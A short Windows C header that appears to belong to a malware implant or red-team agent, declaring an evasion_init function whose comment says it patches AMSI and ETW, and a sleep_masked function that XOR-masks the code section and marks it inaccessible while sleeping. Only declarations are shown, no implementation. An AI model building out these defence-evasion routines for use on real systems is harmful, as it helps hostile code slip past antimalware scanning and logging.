#pragma once
#include <windows.h>

/* Call once at startup: patches AMSI/ETW, resolves fn ptrs, finds .text */
void evasion_init(void);

/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section */
void sleep_masked(DWORD ms);
